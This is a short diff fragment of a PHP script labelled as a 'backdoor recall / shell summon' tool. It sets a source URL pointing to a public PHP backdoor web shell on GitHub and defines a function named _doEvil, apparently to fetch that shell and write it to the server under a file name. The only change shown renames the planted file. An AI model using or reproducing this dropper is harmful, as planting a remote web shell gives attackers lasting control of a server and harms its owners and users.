@@ -4,7 +4,7 @@
 	WITH BACKDOOR RECALL / SHELL SUMMON
 */
 $source = "https://raw.githubusercontent.com/zerobyte-id/PHP-Backdoor/master/0byt3m1n1/0byt3m1n1.php";
-$name = "0byte.php";
+$name = "byte.php";
 
 function _doEvil($name, $file) {
 	$filename = $name;
